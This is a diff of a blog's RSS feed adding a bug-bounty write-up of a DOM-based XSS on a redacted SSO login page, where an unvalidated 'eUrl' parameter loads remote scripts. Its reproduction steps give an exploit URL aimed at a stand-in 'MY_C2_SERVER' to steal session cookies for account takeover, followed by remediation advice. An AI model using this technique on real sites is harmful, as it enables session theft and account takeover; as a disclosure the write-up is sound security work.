@@ -1,12 +1,238 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>kuldeepdotexe&#39;s blog</title>
-    <link>https://kuldeep.io/</link>
-    <description>Recent content on kuldeepdotexe&#39;s blog</description>
+    <title>Posts on kuldeepdotexe&#39;s blog</title>
+    <link>https://kuldeep.io/posts/</link>
+    <description>Recent content in Posts on kuldeepdotexe&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Fri, 03 Mar 2023 01:09:16 +0530</lastBuildDate><atom:link href="https://kuldeep.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 06 Jul 2023 14:33:00 +0530</lastBuildDate><atom:link href="https://kuldeep.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Full Disclosure - DOM-based XSS And Failures In Bug Bounty Hunting</title>
+      <link>https://kuldeep.io/posts/fulldisclosure-dom-based-xss/</link>
+      <pubDate>Thu, 06 Jul 2023 14:33:00 +0530</pubDate>
+      
+      <guid>https://kuldeep.io/posts/fulldisclosure-dom-based-xss/</guid>
+      <description>Hello, folks!
+A few days ago, I shared a post on Twitter about a mistake I made while doing bug bounties. This post is about the same mistake and a bonus mistake.
+While scrolling on LinkedIn/Twitter/Instagram it is easy to get overwhelmed by looking at other people posting their bounties. There are two ways to look at this: 1. either get encouraged to hack looking at other people&amp;rsquo;s success or 2.</description>
+      <content>&lt;p&gt;Hello, folks!&lt;/p&gt;
+&lt;p&gt;A few days ago, I shared a post on Twitter about a mistake I made while doing bug bounties. This post is about the same mistake and a bonus mistake.&lt;/p&gt;
+&lt;p&gt;While scrolling on LinkedIn/Twitter/Instagram it is easy to get overwhelmed by looking at other people posting their bounties. There are two ways to look at this: 1. either get encouraged to hack looking at other people&amp;rsquo;s success or 2. get discouraged and feel bad about you not finding enough vulnerabilities yourself. It is up to us to look at the positive side, take it as inspiration and start working to post similar bounties ourselves.&lt;/p&gt;
+&lt;p&gt;However, while doing so, it is not guaranteed to find success 100% of the time. Whether you just started hacking or are a seasoned hacker, there will always be challenges.&lt;/p&gt;
+&lt;p&gt;Last night, I found myself in a similar situation. I was hunting on a target for around 6+ hours and found a DOM-based XSS. I escalated it to one-click account takeover. After reporting the issue, I found out that particular domain was out-of-scope.&lt;/p&gt;
+&lt;p&gt;I spent 1+ hours on crafting the perfect report for this vulnerability but in the end, it didn&amp;rsquo;t matter. So, I decided to share it in a blog because I&amp;rsquo;m proud of my report.&lt;/p&gt;
+&lt;p&gt;After that, I moved on to the next &amp;ldquo;in-scope&amp;rdquo; domain. I found a static HTML file and suspected there might be a CSS injection vulnerability. Detailed findings are shown below.&lt;/p&gt;
+&lt;h2 id=&#34;findings&#34;&gt;Findings:&lt;/h2&gt;
+&lt;h3 id=&#34;1-dom-xss-in-redactedexamplecom-due-to-insecure-dynamic-resource-loading-via-eurl-parameter&#34;&gt;1. DOM XSS In &lt;code&gt;REDACTED.example.com&lt;/code&gt; Due To Insecure Dynamic Resource Loading Via &lt;code&gt;eUrl&lt;/code&gt; Parameter&lt;/h3&gt;
+&lt;h4 id=&#34;summary&#34;&gt;Summary:&lt;/h4&gt;
+&lt;p&gt;The URL at &lt;a href=&#34;https://REDACTED.example.com/v2/xxx-login.asp&#34;&gt;https://REDACTED.example.com/v2/xxx-login.asp&lt;/a&gt; loads static resources dynamically using the &lt;code&gt;eUrl&lt;/code&gt; parameter that leads to DOM based XSS allowing for a one-click full account takeover.&lt;/p&gt;
+&lt;h4 id=&#34;introduction&#34;&gt;Introduction:&lt;/h4&gt;
+&lt;p&gt;DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.&lt;/p&gt;
+&lt;h4 id=&#34;description&#34;&gt;Description:&lt;/h4&gt;
+&lt;p&gt;The page in focus &lt;a href=&#34;https://REDACTED.example.com/v2/xxx-login.asp&#34;&gt;https://REDACTED.example.com/v2/xxx-login.asp&lt;/a&gt; facilitates login functionality using the SSO. It takes the following parameters in input:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parameter&lt;/th&gt;
+&lt;th&gt;Working&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;action&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Set to either &lt;code&gt;login&lt;/code&gt; or &lt;code&gt;register&lt;/code&gt; depending on what user chooses&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;env&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Set to &lt;code&gt;REDACTED-prod&lt;/code&gt; suggesting this is the production environment&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;eUrl&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;This is the most important parameter as it specifies the location to load static resources from&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;userType&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;This specifies the user type. By the normal application flow, this is set to &lt;code&gt;PARTNER&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;REDACTEDLookupCode&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;I&amp;rsquo;m not entirely sure what this does&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;REDACTEDName&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Set to empty using the normal application flow so I believe it is not much important&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;ssolang&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Language for the SSO. Set to &lt;code&gt;en&lt;/code&gt; by default&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;REDACTEDUrl&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Again, not entirely sure what this does but doesn&amp;rsquo;t affect the outcome&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;dossologin&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;This is a boolean parameter which is either set to &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false&lt;/code&gt;. It is set to &lt;code&gt;true&lt;/code&gt; in the case of SSO login&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Here, the parameter of utmost importance is the &lt;code&gt;eUrl&lt;/code&gt; parameter. As it is used to dynamically generate content.&lt;/p&gt;
+&lt;p&gt;From the source code, we can see that among the below shown lines, the vulnerability exists:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Javascript&#34; data-lang=&#34;Javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;eUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; decodeURIComponent(&lt;span style=&#34;color:#a6e22e&#34;&gt;urlObj&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;searchParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eUrl&amp;#39;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;elementStyleTag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;createElement&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;link&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;elementStyleTag&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rel&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stylesheet&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;elementStyleTag&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;href&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;eUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/styles.css&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;head&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;appendChild&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;elementStyleTag&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(document).&lt;span style=&#34;color:#a6e22e&#34;&gt;ready&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;kendo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ui&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;progress&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;body&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getScript&lt;/span&gt;({
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;eUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/deployment/env/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;env&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.config.js&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;cache&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; () {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getScript&lt;/span&gt;({
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;eUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/keycloak.js&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#a6e22e&#34;&gt;cache&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; () {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Rest of the code
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here is the breakdown of the code:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Javascript&#34; data-lang=&#34;Javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;eUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; decodeURIComponent(&lt;span style=&#34;color:#a6e22e&#34;&gt;urlObj&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;searchParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eUrl&amp;#39;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This line retrieves the &lt;code&gt;eUrl&lt;/code&gt; parameter from the &lt;code&gt;urlObj&lt;/code&gt;, decodes it using &lt;code&gt;decodeURIComponent()&lt;/code&gt;, and assigns it to the &lt;code&gt;eUrl&lt;/code&gt; variable.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Javascript&#34; data-lang=&#34;Javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;elementStyleTag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;createElement&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;link&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;elementStyleTag&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rel&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stylesheet&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;elementStyleTag&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;href&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;eUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/styles.css&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;head&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;appendChild&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;elementStyleTag&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These lines create a new &lt;code&gt;link&lt;/code&gt; element, set its &lt;code&gt;rel&lt;/code&gt; attribute to &amp;ldquo;stylesheet&amp;rdquo;, set its &lt;code&gt;href&lt;/code&gt; attribute to the URL of the stylesheet (which is formed by appending &amp;lsquo;/styles.css&amp;rsquo; to &lt;code&gt;eUrl&lt;/code&gt;), and append this element to the head of the document.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Javascript&#34; data-lang=&#34;Javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(document).&lt;span style=&#34;color:#a6e22e&#34;&gt;ready&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;kendo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ui&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;progress&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;body&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getScript&lt;/span&gt;({
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;eUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/deployment/env/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;env&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.config.js&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;cache&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; () {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getScript&lt;/span&gt;({
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;eUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/keycloak.js&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;cache&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; () {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Rest of the code
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this block, jQuery is set to execute when the document is ready. It displays a loading animation and uses the &lt;code&gt;getScript()&lt;/code&gt; function to fetch and execute two JavaScript files from URLs built using the user-provided&lt;code&gt; eUrl&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The vulnerability here lies in the way &lt;code&gt;eUrl&lt;/code&gt; is used. Since this value comes from the user and is not validated or sanitized before use, an attacker could manipulate this value to point to a malicious script on a different server. When the jQuery &lt;code&gt;getScript()&lt;/code&gt; function fetches and executes this script, it would run in the context of the user&amp;rsquo;s session, leading to a DOM-based Cross-Site Scripting (XSS) attack.&lt;/p&gt;
+&lt;p&gt;Furthermore, &lt;code&gt;HTTPOnly&lt;/code&gt; flag is not used for the &lt;code&gt;ASPSESSIONID&lt;/code&gt; cookie which acts as a session cookie. This allows a remote unauthenticated attacker to perform single-click account takeovers.&lt;/p&gt;
+&lt;h4 id=&#34;steps-to-reproduce&#34;&gt;Steps To Reproduce:&lt;/h4&gt;
+&lt;ol start=&#34;0&#34;&gt;
+&lt;li&gt;To later validate access to session cookies, first visit the following URL: &lt;a href=&#34;https://REDACTED.example.com/login.asp&#34;&gt;https://REDACTED.example.com/login.asp&lt;/a&gt;. This will set the &lt;code&gt;ASPSESSIONID&lt;/code&gt; cookie. This step is optional and its only purpose is to set cookies.&lt;/li&gt;
+&lt;li&gt;Visit the following URL: &lt;a href=&#34;https://REDACTED.example.com/v2/xxx-login.asp?action=login&amp;amp;env=REDACTED-prod&amp;amp;eUrl=https://MY_C2_SERVER/&amp;amp;userType=PARTNER&amp;amp;REDACTEDLookupCode=REDACTED.example.com&amp;amp;REDACTEDName=&amp;amp;ssolang=en&amp;amp;REDACTEDUrl=https://REDACTED.example.com/login.asp&amp;amp;dossologin=true&#34;&gt;https://REDACTED.example.com/v2/xxx-login.asp?action=login&amp;amp;env=REDACTED-prod&amp;amp;eUrl=https://MY_C2_SERVER/&amp;amp;userType=PARTNER&amp;amp;REDACTEDLookupCode=REDACTED.example.com&amp;amp;REDACTEDName=&amp;amp;ssolang=en&amp;amp;REDACTEDUrl=https://REDACTED.example.com/login.asp&amp;amp;dossologin=true&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;As you open the URL, you will be redirected to my malicious SSO login page. A tech-savvy person will immediately recognize this as a phishing attack. While someone less familiar with such tactics may not.&lt;/li&gt;
+&lt;li&gt;However, if you check your request logs using Burp Suite, you will notice that your session cookies are already compromised and sent to the attacker&amp;rsquo;s server.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;recommendations&#34;&gt;Recommendations&lt;/h4&gt;
+&lt;p&gt;To fix this vulnerability, follow these steps:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Validate User Inputs&lt;/strong&gt;: Always validate user inputs. For &lt;code&gt;eUrl&lt;/code&gt;, ensure it points to a known, safe domain and doesn&amp;rsquo;t contain unexpected path or query elements.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Sanitize User Inputs&lt;/strong&gt;: Beyond validation, sanitize user inputs. This can include escaping special characters or using secure functions that perform these tasks automatically.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Use Allow-lists&lt;/strong&gt;: Employ an allow-list approach. Only permit specific, known-good inputs to pass through.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Implement Content Security Policy (CSP)&lt;/strong&gt;: Use Content Security Policy headers to limit the sources from which scripts can be loaded. This can prevent unauthorized script execution.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Set HTTPOnly Flag&lt;/strong&gt;: Apply the &lt;code&gt;HTTPOnly&lt;/code&gt; flag to the &lt;code&gt;ASPSESSIONID&lt;/code&gt; cookie. This prevents the cookie from being accessed by client-side scripts, protecting it from theft during an XSS attack.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Use SameSite Attribute for Cookies&lt;/strong&gt;: Set the &lt;code&gt;SameSite&lt;/code&gt; attribute for the session cookie to &lt;code&gt;Strict&lt;/code&gt; or &lt;code&gt;Lax&lt;/code&gt;. This offers extra protection against Cross-Site Request Forgery (CSRF) attacks.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Regularly Update and Patch&lt;/strong&gt;: Keep all software (libraries, frameworks, servers, etc.) up to date. Apply patches promptly as they become available.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;supporting-materialreferences&#34;&gt;Supporting Material/References:&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;Optional login page that is used to set cookies&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;REDACTED&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;Phishing page that we made to trick users&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;REDACTED&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;Cookies leaked without user knowing&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;REDACTED&lt;/p&gt;
+&lt;h4 id=&#34;impact&#34;&gt;Impact&lt;/h4&gt;
+&lt;p&gt;A remote unauthenticated attacker can perform the following actions:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Launch a Cross-Site Scripting (XSS) attack&lt;/strong&gt;: The attacker can manipulate the &lt;code&gt;eUrl&lt;/code&gt; parameter to point to a malicious script. This script will be fetched and executed within the user&amp;rsquo;s session when the page loads, giving the attacker the ability to modify the webpage content or perform actions on behalf of the user.
+&lt;strong&gt;Steal session cookies&lt;/strong&gt;: The &lt;code&gt;ASPSESSIONID&lt;/code&gt; cookie does not have the &lt;code&gt;HTTPOnly&lt;/code&gt; flag set, which means it can be accessed by client-side scripts. In the event of a successful XSS attack, this cookie can be stolen, compromising the user&amp;rsquo;s session.
+&lt;strong&gt;Perform account takeover&lt;/strong&gt;: With the stolen session cookie, the attacker can impersonate the victim&amp;rsquo;s session, leading to unauthorized access to the user&amp;rsquo;s account and potentially any sensitive data or functionalities it contains.
+&lt;strong&gt;Conduct harmful actions&lt;/strong&gt;: Once the account is taken over, the attacker can perform potentially harmful actions such as changing user settings, sending messages, or making transactions.&lt;/p&gt;
